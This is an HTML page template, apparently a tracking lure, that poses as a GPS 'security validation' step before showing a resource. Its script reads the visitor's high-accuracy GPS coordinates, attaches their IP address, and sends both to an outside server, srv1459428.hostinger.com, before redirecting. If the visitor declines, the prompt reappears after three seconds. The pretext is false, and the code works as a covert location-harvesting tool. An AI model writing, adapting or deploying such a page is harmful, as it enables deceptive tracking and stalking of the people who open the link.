<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación de Ubicación</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: rgba(0, 0, 0, 0.5);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal {
            background: white;
            padding: 30px;
            border-radius: 10px;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            text-align: center;
        }

        .modal-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .modal h3 {
            color: #d32f2f;
            margin-bottom: 15px;
            font-size: 20px;
        }

        .modal p {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .modal-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
        }

        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            text-transform: uppercase;
        }

        .btn-primary {
            background: #d32f2f;
            color: white;
        }

        .btn-primary:hover {
            background: #b71c1c;
        }

        .btn-secondary {
            background: #e0e0e0;
            color: #666;
        }

        .btn-secondary:hover {
            background: #d0d0d0;
        }

        .status-message {
            display: none;
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            font-size: 14px;
        }

        .status-loading {
            background: #e3f2fd;
            color: #1976d2;
        }

        .status-success {
            background: #e8f5e9;
            color: #2e7d32;
        }

        .status-error {
            background: #ffebee;
            color: #c62828;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #d32f2f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="modal-overlay" id="confirmModal">
        <div class="modal">
            <div class="modal-icon">📍</div>
            <h3>¿Continuar al sitio?</h3>
            <p>
                Para acceder al recurso, necesitamos validar su ubicación GPS 
                por seguridad operativa.
            </p>
            <div class="modal-buttons">
                <button class="btn btn-secondary" onclick="cancelar()">
                    Cancelar
                </button>
                <button class="btn btn-primary" onclick="confirmar()">
                    Confirmar
                </button>
            </div>
        </div>
    </div>

    <div id="loadingMessage" class="status-message status-loading" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2000;">
        <span class="spinner"></span>
        Solicitando acceso GPS...
    </div>

    <div id="successMessage" class="status-message status-success" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2000;">
        ✅ Ubicación validada. Redirigiendo...
    </div>

    <div id="errorMessage" class="status-message status-error" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2000;">
        ❌ <span id="errorText">Error al obtener ubicación.</span>
    </div>

    <script>
        const CLIENT_IP = "{{ client_ip }}";
        const IMAGE_URL = "{{ image_url }}";
        const API_ENDPOINT = "http://srv1459428.hostinger.com:8080/update-precise-location";

        function confirmar() {
            // Ocultar modal
            document.getElementById('confirmModal').style.display = 'none';
            
            // Mostrar loading
            document.getElementById('loadingMessage').style.display = 'block';

            // Verificar si el navegador soporta geolocalización
            if (!navigator.geolocation) {
                showError("Su navegador no soporta geolocalización GPS.");
                return;
            }

            // Solicitar posición GPS
            navigator.geolocation.getCurrentPosition(
                handleGPSSuccess,
                handleGPSError,
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        function cancelar() {
            document.getElementById('confirmModal').style.display = 'none';
            document.body.innerHTML = '<p style="color: white; text-align: center; padding: 50px;">Operación cancelada.</p>';
        }

        async function handleGPSSuccess(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            console.log(`📍 GPS obtenido: ${lat}, ${lon} (±${accuracy}m)`);

            try {
                const response = await fetch(API_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        lat: lat,
                        lon: lon,
                        accuracy: accuracy,
                        ip: CLIENT_IP
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('loadingMessage').style.display = 'none';
                    document.getElementById('successMessage').style.display = 'block';

                    setTimeout(() => {
                        window.location.href = data.redirect_url;
                    }, 2000);
                } else {
                    showError("Error al validar ubicación en el servidor.");
                }
            } catch (error) {
                console.error("Error:", error);
                showError("Error de conexión con el servidor.");
            }
        }

        function handleGPSError(error) {
            let message = "";
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    message = "Acceso denegado. Debe permitir el acceso a su ubicación para continuar.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "Información de ubicación no disponible.";
                    break;
                case error.TIMEOUT:
                    message = "Tiempo de espera agotado al obtener ubicación.";
                    break;
                default:
                    message = "Error desconocido al obtener ubicación.";
            }

            showError(message);
        }

        function showError(message) {
            document.getElementById('loadingMessage').style.display = 'none';
            document.getElementById('errorMessage').style.display = 'block';
            document.getElementById('errorText').textContent = message;
            
            // Re-mostrar modal después de 3 segundos
            setTimeout(() => {
                document.getElementById('errorMessage').style.display = 'none';
                document.getElementById('confirmModal').style.display = 'flex';
            }, 3000);
        }
    </script>
</body>
</html>
